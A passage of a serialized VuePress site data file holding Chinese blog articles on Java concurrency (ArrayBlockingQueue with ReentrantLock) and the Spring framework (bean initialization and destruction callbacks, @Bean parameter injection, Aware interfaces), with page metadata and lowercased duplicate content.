00:47:23",lastUpdatedTimestamp:1650214043e3},{title:"阻塞队列使用ReentrantLock源码分析",frontmatter:{title:"阻塞队列使用ReentrantLock源码分析",date:"2022-04-17T23:33:06.000Z",permalink:"/pages/7882c9/",categories:["java","多线程"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/04.java/03.%E5%A4%9A%E7%BA%BF%E7%A8%8B/11.%E9%98%BB%E5%A1%9E%E9%98%9F%E5%88%97%E4%BD%BF%E7%94%A8ReentrantLock%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90.html",relativePath:"04.java/03.多线程/11.阻塞队列使用ReentrantLock源码分析.md",key:"v-65e81c66",path:"/pages/7882c9/",headersStr:null,content:'ArrayBlockingQueue其中的几个对象是\n\npublic class ArrayBlockingQueue<E> extends AbstractQueue<E>\n        implements BlockingQueue<E>, java.io.Serializable {\n    //队列的item\n    final Object[] items;\n\n    //获取index的序号\n    int takeIndex;\n\n    //放置item的序号\n    int putIndex;\n\n    //元素个数\n    int count;\n\t\n\t   //锁\n    final ReentrantLock lock;\n\n    //Condition 不空\n    private final Condition notEmpty;\n\n    //Condition 不满\n    private final Condition notFull;\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\nput元素代码分析\n\npublic void put(E e) throws InterruptedException {\n\tcheckNotNull(e);\n\tfinal ReentrantLock lock = this.lock;\n\tlock.lockInterruptibly();\n\ttry {\n\t\twhile (count == items.length)\n\t\t\tnotFull.await();\n\t\tenqueue(e);\n\t} finally {\n\t\tlock.unlock();\n\t}\n}\n\nprivate void enqueue(E x) {\n\t// assert lock.getHoldCount() == 1;\n\t// assert items[putIndex] == null;\n\tfinal Object[] items = this.items;\n\titems[putIndex] = x;\n\tif (++putIndex == items.length)\n\t\tputIndex = 0;\n\tcount++;\n\tnotEmpty.signal();\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\ntake元素代码分析\n\npublic E take() throws InterruptedException {\n\tfinal ReentrantLock lock = this.lock;\n\tlock.lockInterruptibly();\n\ttry {\n\t\twhile (count == 0)\n\t\t\tnotEmpty.await();\n\t\treturn dequeue();\n\t} finally {\n\t\tlock.unlock();\n\t}\n}\n\nprivate E dequeue() {\n\t// assert lock.getHoldCount() == 1;\n\t// assert items[takeIndex] != null;\n\tfinal Object[] items = this.items;\n\t@SuppressWarnings("unchecked")\n\tE x = (E) items[takeIndex];\n\titems[takeIndex] = null;\n\tif (++takeIndex == items.length)\n\t\ttakeIndex = 0;\n\tcount--;\n\tif (itrs != null)\n\t\titrs.elementDequeued();\n\tnotFull.signal();\n\treturn x;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n',normalizedContent:'arrayblockingqueue其中的几个对象是\n\npublic class arrayblockingqueue<e> extends abstractqueue<e>\n        implements blockingqueue<e>, java.io.serializable {\n    //队列的item\n    final object[] items;\n\n    //获取index的序号\n    int takeindex;\n\n    //放置item的序号\n    int putindex;\n\n    //元素个数\n    int count;\n\t\n\t   //锁\n    final reentrantlock lock;\n\n    //condition 不空\n    private final condition notempty;\n\n    //condition 不满\n    private final condition notfull;\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\nput元素代码分析\n\npublic void put(e e) throws interruptedexception {\n\tchecknotnull(e);\n\tfinal reentrantlock lock = this.lock;\n\tlock.lockinterruptibly();\n\ttry {\n\t\twhile (count == items.length)\n\t\t\tnotfull.await();\n\t\tenqueue(e);\n\t} finally {\n\t\tlock.unlock();\n\t}\n}\n\nprivate void enqueue(e x) {\n\t// assert lock.getholdcount() == 1;\n\t// assert items[putindex] == null;\n\tfinal object[] items = this.items;\n\titems[putindex] = x;\n\tif (++putindex == items.length)\n\t\tputindex = 0;\n\tcount++;\n\tnotempty.signal();\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\ntake元素代码分析\n\npublic e take() throws interruptedexception {\n\tfinal reentrantlock lock = this.lock;\n\tlock.lockinterruptibly();\n\ttry {\n\t\twhile (count == 0)\n\t\t\tnotempty.await();\n\t\treturn dequeue();\n\t} finally {\n\t\tlock.unlock();\n\t}\n}\n\nprivate e dequeue() {\n\t// assert lock.getholdcount() == 1;\n\t// assert items[takeindex] != null;\n\tfinal object[] items = this.items;\n\t@suppresswarnings("unchecked")\n\te x = (e) items[takeindex];\n\titems[takeindex] = null;\n\tif (++takeindex == items.length)\n\t\ttakeindex = 0;\n\tcount--;\n\tif (itrs != null)\n\t\titrs.elementdequeued();\n\tnotfull.signal();\n\treturn x;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n',charsets:{cjk:!0},lastUpdated:"2022/04/18, 00:47:23",lastUpdatedTimestamp:1650214043e3},{title:"@Bean注解的方法参数自动注入规则(构造函数一样遵守)",frontmatter:{title:"@Bean注解的方法参数自动注入规则(构造函数一样遵守)",date:"2022-04-17T23:27:53.000Z",permalink:"/pages/d1b977/",categories:["java","spring"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/04.java/04.spring/01.@Bean%E6%B3%A8%E8%A7%A3%E7%9A%84%E6%96%B9%E6%B3%95%E5%8F%82%E6%95%B0%E8%87%AA%E5%8A%A8%E6%B3%A8%E5%85%A5%E8%A7%84%E5%88%99(%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0%E4%B8%80%E6%A0%B7%E9%81%B5%E5%AE%88).html",relativePath:"04.java/04.spring/01.@Bean注解的方法参数自动注入规则(构造函数一样遵守).md",key:"v-7d88bd5e",path:"/pages/d1b977/",headersStr:null,content:"@Bean 注解的方法 ,其参数将会被自动视为被 @Autowired ,所修饰 ,注入规则为按类型注入 ,如果有多个同类型把参数当 BeanId 按名称注入",normalizedContent:"@bean 注解的方法 ,其参数将会被自动视为被 @autowired ,所修饰 ,注入规则为按类型注入 ,如果有多个同类型把参数当 beanid 按名称注入",charsets:{cjk:!0},lastUpdated:"2022/04/18, 00:47:23",lastUpdatedTimestamp:1650214043e3},{title:"Spring Bean 生命周期之“我要到哪里去”？",frontmatter:{title:"Spring Bean 生命周期之“我要到哪里去”？",date:"2022-04-17T23:27:53.000Z",permalink:"/pages/73803e/",categories:["java","spring"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/04.java/04.spring/03.Spring%20Bean%20%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E4%B9%8B%E2%80%9C%E6%88%91%E8%A6%81%E5%88%B0%E5%93%AA%E9%87%8C%E5%8E%BB%E2%80%9D%EF%BC%9F.html",relativePath:"04.java/04.spring/03.Spring Bean 生命周期之“我要到哪里去”？.md",key:"v-6a558438",path:"/pages/73803e/",headers:[{level:2,title:"三种销毁 Spring Bean 的方式",slug:"三种销毁-spring-bean-的方式",normalizedTitle:"三种销毁 spring bean 的方式",charIndex:881},{level:3,title:"DisposableBean",slug:"disposablebean",normalizedTitle:"disposablebean",charIndex:177},{level:3,title:"@PreDestroy",slug:"predestroy",normalizedTitle:"@predestroy",charIndex:160},{level:3,title:"destroy-method",slug:"destroy-method",normalizedTitle:"destroy-method",charIndex:207}],headersStr:"三种销毁 Spring Bean 的方式 DisposableBean @PreDestroy destroy-method",content:'Spring Bean 生命周期之“我从哪里来”？\n\n初始化 Spring Bean 有三种方式：\n\n 1. @PostConstruct\n\n 2. InitializingBean.afterPropertiesSet()\n\n 3. init-method\n\n销毁 Spring Bean 同样有三种方式：\n\n 1. @PreDestroy\n\n 2. DisposableBean.destroy()\n\n 3. destroy-method\n\n> 正所谓，天对地，雨对风；@PostConstruct 对 @PreDestroy；InitializingBean.afterPropertiesSet() 对 DisposableBean.destroy()；init-method 对 destroy-method；雷隐隐，雾蒙蒙；山花对海树，赤日对苍穹；平仄平仄平平仄，仄平仄平仄仄平，仄仄平……\n\n当 Spring Ioc 容器要移除 bean 时，销毁相关回调方法将会被执行，这么做的目的时释放被 bean 持有的资源，或者去执行一些终极任务. 当 ApplicationContext 调用 registerShutdownHook 方法时，这些销毁方法就会被触发，但一般正常的业务中很少会用到这些方法\n\npublic class MainApp {\n  public static void main(String[] args) {\n    AbstractApplicationContext context = new ClassPathXmlApplicationContext("Beans.xml");\n    HelloWorld obj = (HelloWorld) context.getBean("helloWorld");\n    obj.getMessage();context.registerShutdownHook();\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n接下来具体的展示一下三种方法的使用方式\n\n\n# 三种销毁 Spring Bean 的方式\n\n\n# DisposableBean\n\nSpring 为我们提供了 DisposableBean 接口\n\npublic interface DisposableBean {\n  void destroy() throws Exception;\n}\n\n\n1\n2\n3\n\n\n我们可以通过实现DisposableBean接口，在其唯一方法destroy内完成 bean 销毁的工作，但是 Spring Framework 官方并不建议我们通过这种方法来销毁 bean，这同样是一种强耦合的方式，我们看到框架层面才会用到这个方法。\n\n\n# @PreDestroy\n\n这种方式是 Spring 非常提倡的一种方式，我们通常将其标记在方法上即可，通常习惯将这个方法起名为destory()\n\n@PreDestroypublic \nvoid destroy() {\n  System.out.println("inside destroy() method");\n}\n\n\n1\n2\n3\n4\n\n\n\n# destroy-method\n\n同样是两种方式，第一种方式：\n\npublic class MyClass {\n  public void destory() {\n    // perform destroy logic here}\n  }\n}\n\n@Configuration\npublic class AppConfig \n{\n  @Bean(destroyMethod = "destroy")\n  public MyClass myclass() {\n    return new MyClass ();\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n第二种方式\n\n<bean id="myClass" class="com.demo.MyClass" destory-method="destory"/>\n\n\n1\n\n\n以上三种 Bean 的销毁方式也是可以组合使用的，那么组合在一起的调用顺序是什么呢？\n\n 1. 首先 @PreDestroy 会被调用\n\n 2. 其次 DisposableBean.destroy() 会被调用\n\n 3. 最后调用通过 XML 配置的 destroy-method 方法或通过设置 @Bean 注解 设置 destroyMethod 属性的方法\n\n用图示来说明一下调用顺序\n\n这个调用顺序也不难记忆\n\n> PreDestroy(P)，destroy(D)，destroy-method(D)---\x3ePDD （那个3亿人都在 pin 的那个 APP 名称，目前 3 亿人中没有我）\n\n再来看看 Spring Bean 生命周期图，我们已经点亮了核心部分：\n\n\n\n我们要注意，在销毁的过程并没有类似 BeanPostProcess 那中切面的思想，这里要注意到区别。',normalizedContent:'spring bean 生命周期之“我从哪里来”？\n\n初始化 spring bean 有三种方式：\n\n 1. @postconstruct\n\n 2. initializingbean.afterpropertiesset()\n\n 3. init-method\n\n销毁 spring bean 同样有三种方式：\n\n 1. @predestroy\n\n 2. disposablebean.destroy()\n\n 3. destroy-method\n\n> 正所谓，天对地，雨对风；@postconstruct 对 @predestroy；initializingbean.afterpropertiesset() 对 disposablebean.destroy()；init-method 对 destroy-method；雷隐隐，雾蒙蒙；山花对海树，赤日对苍穹；平仄平仄平平仄，仄平仄平仄仄平，仄仄平……\n\n当 spring ioc 容器要移除 bean 时，销毁相关回调方法将会被执行，这么做的目的时释放被 bean 持有的资源，或者去执行一些终极任务. 当 applicationcontext 调用 registershutdownhook 方法时，这些销毁方法就会被触发，但一般正常的业务中很少会用到这些方法\n\npublic class mainapp {\n  public static void main(string[] args) {\n    abstractapplicationcontext context = new classpathxmlapplicationcontext("beans.xml");\n    helloworld obj = (helloworld) context.getbean("helloworld");\n    obj.getmessage();context.registershutdownhook();\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n接下来具体的展示一下三种方法的使用方式\n\n\n# 三种销毁 spring bean 的方式\n\n\n# disposablebean\n\nspring 为我们提供了 disposablebean 接口\n\npublic interface disposablebean {\n  void destroy() throws exception;\n}\n\n\n1\n2\n3\n\n\n我们可以通过实现disposablebean接口，在其唯一方法destroy内完成 bean 销毁的工作，但是 spring framework 官方并不建议我们通过这种方法来销毁 bean，这同样是一种强耦合的方式，我们看到框架层面才会用到这个方法。\n\n\n# @predestroy\n\n这种方式是 spring 非常提倡的一种方式，我们通常将其标记在方法上即可，通常习惯将这个方法起名为destory()\n\n@predestroypublic \nvoid destroy() {\n  system.out.println("inside destroy() method");\n}\n\n\n1\n2\n3\n4\n\n\n\n# destroy-method\n\n同样是两种方式，第一种方式：\n\npublic class myclass {\n  public void destory() {\n    // perform destroy logic here}\n  }\n}\n\n@configuration\npublic class appconfig \n{\n  @bean(destroymethod = "destroy")\n  public myclass myclass() {\n    return new myclass ();\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n第二种方式\n\n<bean id="myclass" class="com.demo.myclass" destory-method="destory"/>\n\n\n1\n\n\n以上三种 bean 的销毁方式也是可以组合使用的，那么组合在一起的调用顺序是什么呢？\n\n 1. 首先 @predestroy 会被调用\n\n 2. 其次 disposablebean.destroy() 会被调用\n\n 3. 最后调用通过 xml 配置的 destroy-method 方法或通过设置 @bean 注解 设置 destroymethod 属性的方法\n\n用图示来说明一下调用顺序\n\n这个调用顺序也不难记忆\n\n> predestroy(p)，destroy(d)，destroy-method(d)---\x3epdd （那个3亿人都在 pin 的那个 app 名称，目前 3 亿人中没有我）\n\n再来看看 spring bean 生命周期图，我们已经点亮了核心部分：\n\n\n\n我们要注意，在销毁的过程并没有类似 beanpostprocess 那中切面的思想，这里要注意到区别。',charsets:{cjk:!0},lastUpdated:"2022/04/28, 14:45:19",lastUpdatedTimestamp:1651128319e3},{title:"Spring Bean 生命周期之“我从哪里来”？",frontmatter:{title:"Spring Bean 生命周期之“我从哪里来”？",date:"2022-04-17T23:27:53.000Z",permalink:"/pages/9e801a/",categories:["java","spring"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/04.java/04.spring/02.Spring%20Bean%20%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E4%B9%8B%E2%80%9C%E6%88%91%E4%BB%8E%E5%93%AA%E9%87%8C%E6%9D%A5%E2%80%9D%EF%BC%9F.html",relativePath:"04.java/04.spring/02.Spring Bean 生命周期之“我从哪里来”？.md",key:"v-20b845d4",path:"/pages/9e801a/",headers:[{level:2,title:"三种初始化方式",slug:"三种初始化方式",normalizedTitle:"三种初始化方式",charIndex:1005},{level:3,title:"InitializingBean",slug:"initializingbean",normalizedTitle:"initializingbean",charIndex:1017},{level:3,title:"@PostConstruct",slug:"postconstruct",normalizedTitle:"@postconstruct",charIndex:1304},{level:3,title:"init-method",slug:"init-method",normalizedTitle:"init-method",charIndex:1480},{level:2,title:"BeanPostProcessor",slug:"beanpostprocessor",normalizedTitle:"beanpostprocessor",charIndex:2226}],headersStr:"三种初始化方式 InitializingBean @PostConstruct init-method BeanPostProcessor",content:'> Spring bean 的生命周期很容易理解。实例化 bean 时，可能需要执行一些初始化以使其进入可用 （Ready for Use）状态。类似地，当不再需要 bean 并将其从容器中移除时，可能需要进行一些清理，这就是它的生命周期\n\n接口 Beanfactory 和 ApplicationContext 可以通过T getBean(String name, Class<T> requiredType)方法从 Spring 容器中获取bean，区别是，前者是懒加载形式，后者是预加载的形式。那么问题来了：\n\n> 这些 Spring Beans 是怎么生成出来的呢？\n\n在正式回答这个问题之前，先解答一些有关 Java Bean， Spring Bean 和 Spring IoC 容器这些概念性的疑惑，我希望通过下面这个例子形象说明这些问题：\n\n> 小学生 （Java Bean）通过提交资料申请（元数据配置）加入了少先队（Spring Ioc 容器），学习了一些精神与规定之后，变成了少先队员（Spring Bean）\n\n从这里可以看出，Java Bean 和 Spring Bean 都是具有特定功能的对象，小学生还是那个小学生，只不过加入了少先队之后有了新的身份，新的身份要按照组织 （Spring Ioc）的规定履行特定义务\n\n来看下图加深一下了解\n\n\n\n首先要有容器，实例化 Spring Ioc 容器是非常简单的，接口org.springframework.context.ApplicationContext表示Spring IoC容器，负责实例化，配置和组装上述 bean。容器通过读取配置元数据获取有关要实例化，配置和组装的对象的指令。配置元数据通常以XML，Java 注解或代码的形式表示。它允许你自己表达组成应用程序的对象以及这些对象之间丰富的相互依赖性，比如这样：\n\nApplicationContext context = new ClassPathXmlApplicationContext(new String[] {"spring.xml", "spring1.xml"});\n\n\n1\n\n\n> 有了容器，我们需要做哪些处理，使其内部对象变为Ready for Use的状态?\n\n我们需要通过 Spring 容器实例化它们，Spring 为我们提供了三种方式：\n\n\n# 三种初始化方式\n\n\n# InitializingBean\n\nSpring 为我们提供了InitializingBean接口\n\npublic interface InitializingBean {\n  void afterPropertiesSet() throws Exception;\n}\n\n\n1\n2\n3\n\n\n我们可以通过实现InitializingBean接口，在其唯一方法afterPropertiesSet内完成实例化的工作，但是 Spring Framework 官方并不建议我们通过这种方法来完成 Bean 的实例化，这是一种强耦合的方式，我们看到框架层面才会用到这个方法。\n\n\n# @PostConstruct\n\n这种方式是 Spring 非常提倡的一种方式，我们通常将其标记在方法上即可，通常习惯将这个方法起名为init()\n\n@PostConstruct\npublic void init() {\n  System.out.println("Inside init() method...");\n}\n\n\n1\n2\n3\n4\n\n\n\n# init-method\n\n你应该见过这种初始化方式：\n\npublic class MyClass {\n  public void init() {\n    // perform post-creation logic here\n    }\n}\n\n@Configuration \npublic class AppConfig {\n  @Bean(initMethod = "init")\n  public MyClass myclass() {\n    return new MyClass ();\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n你也应该见过这种配置方式：\n\n<bean id="myClass" class="com.demo.MyClass" init-method="init"/>\n\n\n1\n\n\n没错，这只是同样功能的不同实现方式罢了以上就是三种初始化 Spring Beans 的方式，我们在框架中看到过三种方式在组合使用，那么组合使用的调用顺序是什么呢？\n\n 1. 首先@PostConstruct 会被最先调用\n\n 2. 其次InitializingBean.afterPropertiesSet()方法将会被调用\n\n 3. 最后调用通过 XML 配置的 init-method 方法或通过设置 @Bean 注解 设置 initMethod 属性的方法\n\n了解了这些，你也就了解了 Spring Bean 是怎么来的了\n\n通过图示来说明一下： 组合使用，这个调用顺序很难记忆吗吗？\n\n> PostConstruct(P)，afterPropertiesSet(A)，init-method(I)---\x3ePAI （圆周率π）\n\n\n# BeanPostProcessor\n\nBeanPostProcessor 接口，大家也应该有印象，里面只有两个方法：\n\npublic interface BeanPostProcessor {\n  Object postProcessBeforeInitialization(Object var1, String var2) throws BeansException;\n  \n  Object postProcessAfterInitialization(Object var1, String var2) throws BeansException;\n}\n\n\n1\n2\n3\n4\n5\n\n\n看方法名，BeforeInitialization 和 AfterInitialization，我们应该猜得出，这是在上述三种方式的前和后，算是一种全局的切面思想，我们经常会使用postProcessAfterInitialization方法，通过读取 Bean 的注解完成一些后续逻辑编写与属性的设定，现在Ready for Use之前是这样： 在Ready for Use之前，了解这些内容，已可以基本满足日常的工作内容，但这并不是 Ready for Use 的全部内容，Spring Bean 整个生命周期的流程应该是这样的，后续文章会逐步点亮：',normalizedContent:'> spring bean 的生命周期很容易理解。实例化 bean 时，可能需要执行一些初始化以使其进入可用 （ready for use）状态。类似地，当不再需要 bean 并将其从容器中移除时，可能需要进行一些清理，这就是它的生命周期\n\n接口 beanfactory 和 applicationcontext 可以通过t getbean(string name, class<t> requiredtype)方法从 spring 容器中获取bean，区别是，前者是懒加载形式，后者是预加载的形式。那么问题来了：\n\n> 这些 spring beans 是怎么生成出来的呢？\n\n在正式回答这个问题之前，先解答一些有关 java bean， spring bean 和 spring ioc 容器这些概念性的疑惑，我希望通过下面这个例子形象说明这些问题：\n\n> 小学生 （java bean）通过提交资料申请（元数据配置）加入了少先队（spring ioc 容器），学习了一些精神与规定之后，变成了少先队员（spring bean）\n\n从这里可以看出，java bean 和 spring bean 都是具有特定功能的对象，小学生还是那个小学生，只不过加入了少先队之后有了新的身份，新的身份要按照组织 （spring ioc）的规定履行特定义务\n\n来看下图加深一下了解\n\n\n\n首先要有容器，实例化 spring ioc 容器是非常简单的，接口org.springframework.context.applicationcontext表示spring ioc容器，负责实例化，配置和组装上述 bean。容器通过读取配置元数据获取有关要实例化，配置和组装的对象的指令。配置元数据通常以xml，java 注解或代码的形式表示。它允许你自己表达组成应用程序的对象以及这些对象之间丰富的相互依赖性，比如这样：\n\napplicationcontext context = new classpathxmlapplicationcontext(new string[] {"spring.xml", "spring1.xml"});\n\n\n1\n\n\n> 有了容器，我们需要做哪些处理，使其内部对象变为ready for use的状态?\n\n我们需要通过 spring 容器实例化它们，spring 为我们提供了三种方式：\n\n\n# 三种初始化方式\n\n\n# initializingbean\n\nspring 为我们提供了initializingbean接口\n\npublic interface initializingbean {\n  void afterpropertiesset() throws exception;\n}\n\n\n1\n2\n3\n\n\n我们可以通过实现initializingbean接口，在其唯一方法afterpropertiesset内完成实例化的工作，但是 spring framework 官方并不建议我们通过这种方法来完成 bean 的实例化，这是一种强耦合的方式，我们看到框架层面才会用到这个方法。\n\n\n# @postconstruct\n\n这种方式是 spring 非常提倡的一种方式，我们通常将其标记在方法上即可，通常习惯将这个方法起名为init()\n\n@postconstruct\npublic void init() {\n  system.out.println("inside init() method...");\n}\n\n\n1\n2\n3\n4\n\n\n\n# init-method\n\n你应该见过这种初始化方式：\n\npublic class myclass {\n  public void init() {\n    // perform post-creation logic here\n    }\n}\n\n@configuration \npublic class appconfig {\n  @bean(initmethod = "init")\n  public myclass myclass() {\n    return new myclass ();\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n你也应该见过这种配置方式：\n\n<bean id="myclass" class="com.demo.myclass" init-method="init"/>\n\n\n1\n\n\n没错，这只是同样功能的不同实现方式罢了以上就是三种初始化 spring beans 的方式，我们在框架中看到过三种方式在组合使用，那么组合使用的调用顺序是什么呢？\n\n 1. 首先@postconstruct 会被最先调用\n\n 2. 其次initializingbean.afterpropertiesset()方法将会被调用\n\n 3. 最后调用通过 xml 配置的 init-method 方法或通过设置 @bean 注解 设置 initmethod 属性的方法\n\n了解了这些，你也就了解了 spring bean 是怎么来的了\n\n通过图示来说明一下： 组合使用，这个调用顺序很难记忆吗吗？\n\n> postconstruct(p)，afterpropertiesset(a)，init-method(i)---\x3epai （圆周率π）\n\n\n# beanpostprocessor\n\nbeanpostprocessor 接口，大家也应该有印象，里面只有两个方法：\n\npublic interface beanpostprocessor {\n  object postprocessbeforeinitialization(object var1, string var2) throws beansexception;\n  \n  object postprocessafterinitialization(object var1, string var2) throws beansexception;\n}\n\n\n1\n2\n3\n4\n5\n\n\n看方法名，beforeinitialization 和 afterinitialization，我们应该猜得出，这是在上述三种方式的前和后，算是一种全局的切面思想，我们经常会使用postprocessafterinitialization方法，通过读取 bean 的注解完成一些后续逻辑编写与属性的设定，现在ready for use之前是这样： 在ready for use之前，了解这些内容，已可以基本满足日常的工作内容，但这并不是 ready for use 的全部内容，spring bean 整个生命周期的流程应该是这样的，后续文章会逐步点亮：',charsets:{cjk:!0},lastUpdated:"2022/04/27, 13:26:21",lastUpdatedTimestamp:1651037181e3},{title:"Spring Aware 到底是个啥？",frontmatter:{title:"Spring Aware 到底是个啥？",date:"2022-04-17T23:27:53.000Z",permalink:"/pages/3bd6af/",categories:["java","spring"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/04.java/04.spring/04.Spring%20Aware%20%E5%88%B0%E5%BA%95%E6%98%AF%E4%B8%AA%E5%95%A5%EF%BC%9F.html",relativePath:"04.java/04.spring/04.Spring Aware 到底是个啥？.md",key:"v-68be9a6f",path:"/pages/3bd6af/",headers:[{level:2,title:"Aware",slug:"aware",normalizedTitle:"aware",charIndex:215},{level:2,title:"代码示例",slug:"代码示例",normalizedTitle:"代码示例",charIndex:2016},{level:3,title:"BeanNameAware",slug:"beannameaware",normalizedTitle:"beannameaware",charIndex:431},{level:2,title:"总结",slug:"总结",normalizedTitle:"总结",charIndex:2141},{level:2,title:"灵魂追问",slug:"灵魂追问",normalizedTitle:"灵魂追问",charIndex:2233}],headersStr:"Aware 代码示例 BeanNameAware 总结 灵魂追问",content:'通过如下前序两篇文章:\n\n 1. Spring Bean 生命周期之“我从哪里来”？\n\n 2. Spring Bean 生命周期之“我要到哪里去”？\n\n我们了解了 Spring Bean 的生命周期核心内容，bean 是如何被初始化变为Ready for Use的状态，当资源被回收时又是如何被 destroy 的，但Spring Bean Life Cycle图并未被全部点亮，这篇文章将点亮剩余内容，同时说说你常见的 XxxxAware 接口\n\n为什么要说 Spring Bean 生命周期又说 Aware 呢？下来点亮剩下内容你也许就明白了：\n\n\n\n在 Spring BeanReady for Use之前的起源当然是要调用构造器，所以 Constructor 毋庸置疑是创建 Spring Bean 的第一步\n\n 1. 通过 Setter 方法完成依赖注入，SDI （Setter Dependency Injection）\n\n 2. 依赖注入一旦结束，BeanNameAware.setBeanName()会被调用，它设置该 bean 在 Bean Factory 中的名称\n\n 3. 接下来调用BeanClassLoaderAware.setBeanClassLoader()，为 bean 实例提供类加载器，我们知道所有类都是要通过类加载器加载到上下文的，关于类的加载机制/双亲委派模型（大厂都爱问的面试题）内容会在后续给出来，让你透彻的了解\n\n 4. 然后BeanFactoryAware.setBeanFactory()会被调用为 bean 实例提供其所拥有的 factory\n\n关于 1、2 两点我要额外多说一些内容，请看下面代码：\n\n这里，我们尝试通过构造器访问自动注入的 field Environment env，当构造器被调用时，Spring Bean 还没被完全初始化，这就会导致NullPointerExceptions；我们变换一下方式：\n\n这种方式，Environment 实例被安全注入之后才调用@PostConstruct标记的方法，这样就不会抛出NullPointerException了。\n\n这会回看周期图，有没有豁然开朗？\n\n> 等所有 Spring Bean 都完成依赖注入（周期图中的 Setter Methods 部分）再使用 bean 的引用才是安全的方式，到这里终于可以说一说 Aware 了\n\n\n# Aware\n\nAware 是 Spring 中的一个根接口，继承该接口的子接口有很多，比如周期图中的那三个 Aware，但是该接口没有任何方法，所以大家可以把它理解成一个标记接口：\n\nAware 翻译过来可以理解为"察觉的；注意到的；感知的" ，XxxxAware 也就是对....感知的，没有 Aware 就是无感知的吗？对喽\n\n> Spring 的依赖注入最大亮点就是所有的 Bean 对 Spring 容器的存在是没有意识的，拿Spring Bean 生命周期之“我从哪里来”？文章中“小学生入少先队”为例子说明，小学生还是那个小学生，加入少先队还是加入共青团只不过规则不一样罢了\n\n但是在实际项目中，我们不可避免的要用到 Spring 容器本身提供的资源（难免要有事情需要少先队组织的帮助），这时候要让 Bean 主动意识到 Spring 容器的存在，才能调用 Spring 所提供的资源，这就是 Spring Aware. 其实 Spring Aware 是 Spring 设计为框架内部使用的，若使用了，你的 Bean 将会和 Spring 框架耦合，所以自己不单独使用，但是在读框架源码时希望你不再模糊.\n\n常见的 Spring Aware 接口\n\nAWARE子接口                         描述\nBeanNameAware                    获取容器中 Bean 的名称\nBeanFactoryAware                 获取当前 BeanFactory ，这样可以调用容器的服务\nApplicationContextAware          同上，在BeanFactory 和 ApplicationContext 的区别中已明确说明\nMessageSourceAware               获取 Message Source 相关文本信息\nApplicationEventPublisherAware   发布事件\nResourceLoaderAware              获取资源加载器，这样获取外部资源文件\n\n来看类关系图：\n\n\n\n当然不止以上这些 Aware， 通常使用 Spring Aware 的目的是为了让 Bean 获得 Spring 容器的服务。\n\n\n# 代码示例\n\n\n# BeanNameAware\n\n\n\n注册 bean\n\n运行\n\n和预想一样，Bean Name 输出结果为myCustomBeanName，如果移除掉 @Bean 注解的 name 属性， 输出结果为getMyBeanName\n\n\n# 总结\n\n在大多数情况下，我们应该避免使用任何 Aware 接口，除非我们需要它们。实现这些接口会将代码耦合到Spring框架，但是希望看过本节内容之后阅读框架源码思维更加清晰\n\n\n# 灵魂追问\n\n 1. 框架中有哪些经典的 Aware 应用？\n\n 2. 到现在你能很好的理解 Spring Bean 的生命周期吗？',normalizedContent:'通过如下前序两篇文章:\n\n 1. spring bean 生命周期之“我从哪里来”？\n\n 2. spring bean 生命周期之“我要到哪里去”？\n\n我们了解了 spring bean 的生命周期核心内容，bean 是如何被初始化变为ready for use的状态，当资源被回收时又是如何被 destroy 的，但spring bean life cycle图并未被全部点亮，这篇文章将点亮剩余内容，同时说说你常见的 xxxxaware 接口\n\n为什么要说 spring bean 生命周期又说 aware 呢？下来点亮剩下内容你也许就明白了：\n\n\n\n在 spring beanready for use之前的起源当然是要调用构造器，所以 constructor 毋庸置疑是创建 spring bean 的第一步\n\n 1. 通过 setter 方法完成依赖注入，sdi （setter dependency injection）\n\n 2. 依赖注入一旦结束，beannameaware.setbeanname()会被调用，它设置该 bean 在 bean factory 中的名称\n\n 3. 接下来调用beanclassloaderaware.setbeanclassloader()，为 bean 实例提供类加载器，我们知道所有类都是要通过类加载器加载到上下文的，关于类的加载机制/双亲委派模型（大厂都爱问的面试题）内容会在后续给出来，让你透彻的了解\n\n 4. 然后beanfactoryaware.setbeanfactory()会被调用为 bean 实例提供其所拥有的 factory\n\n关于 1、2 两点我要额外多说一些内容，请看下面代码：\n\n这里，我们尝试通过构造器访问自动注入的 field environment env，当构造器被调用时，spring bean 还没被完全初始化，这就会导致nullpointerexceptions；我们变换一下方式：\n\n这种方式，environment 实例被安全注入之后才调用@postconstruct标记的方法，这样就不会抛出nullpointerexception了。\n\n这会回看周期图，有没有豁然开朗？\n\n> 等所有 spring bean 都完成依赖注入（周期图中的 setter methods 部分）再使用 bean 